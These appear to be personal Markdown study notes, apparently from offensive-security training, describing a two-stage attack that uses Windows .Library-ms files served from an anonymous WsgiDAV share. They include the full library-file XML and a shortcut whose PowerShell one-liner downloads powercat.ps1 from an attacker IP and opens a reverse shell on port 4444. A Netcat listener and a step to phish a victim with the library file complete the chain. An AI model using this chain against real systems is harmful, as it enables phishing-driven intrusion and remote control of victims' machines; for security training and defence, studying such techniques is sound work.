---
tags: WsgiDAV
---
Windows library files: 
- virtual containers for user content
- connect users with data stored in remote locations like web services or shares
- file extension: **.Library-ms**

Pros:
- Majority of spam filters and security technologies will pass Windows library files directly to the user (unlike sending a file hosted on a web server via a link)
- When it is double-clicked, Windows Explorer displays the contents of the remote location as if it were a local directory (user thinks they are opening a local file)

## Obtaining Code Execution via Windows Library Files

Two stages:
1. Use Windows library files to gain foothold on target system
2. Use foothold to provide an executable file (**.lnk**) which will start a reverse shell when double-clicked

### Stage 1

1. Use WsgiDAV as WebDAV server on Kali:
   `pip3 install wsgidav`
2. Create root directory of WebDAV server:
   `mkdir /home/kali/webdav`
   `touch /home/kali/webdav/test.txt`
3. Start server:
   `wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/`
	- `--host=`: specify host ip
	- `--port=`: specify host port
	- `--auth=anonymous`: disables authentication to our share
	- `--root`: set root of web directory
4. Create Windows library file
   Filename: `config.Library-ms`
   Contents: (change URL to the WebSAV server URL)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

Note: After double-clicking the Windows library file, the file contents will be altered by Windows and may not work on future uses.

### Stage 2

1. Create .lnk Windows shortcut file
	1. On Windows Desktop, right-click and create Shortcut
	2. Type the location of the item: (update the IP addresses to the Kali machine's)
	   `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.68:8000/powercat.ps1'); powercat -c 192.168.1.68 -p 4444 -e powershell"`
	3. Set the name of the shortcut file (e.g. `automatic_configuration`)
	4. Finish
2. Start a Python3 web server on port 8000 where powercat.ps1 is located:
   `python3 -m http.server 8000`
	   Note: We could also host the powercat.ps1 file on the writeable WebDAV share, but endpoint security solutions on the target system may remove or quarantine it. If we configure the WebDAV share as read-only, we’d lose a great method of transferring files from target systems.
3. Start a Netcat listener on port 4444:
   `nc -nlvp 4444`
4. Put `automatic_configuration.lnk` in the WebDAV root directory in Kali.
5. Send a phishing email containing the `config.Library-ms` Windows library file to victim and wait for victim to execute the payload.

## Final notes

Could also combine this method with others (e.g. Microsoft Office macros)

Windows Defender blocked the execution of the reverse shell HAH



   

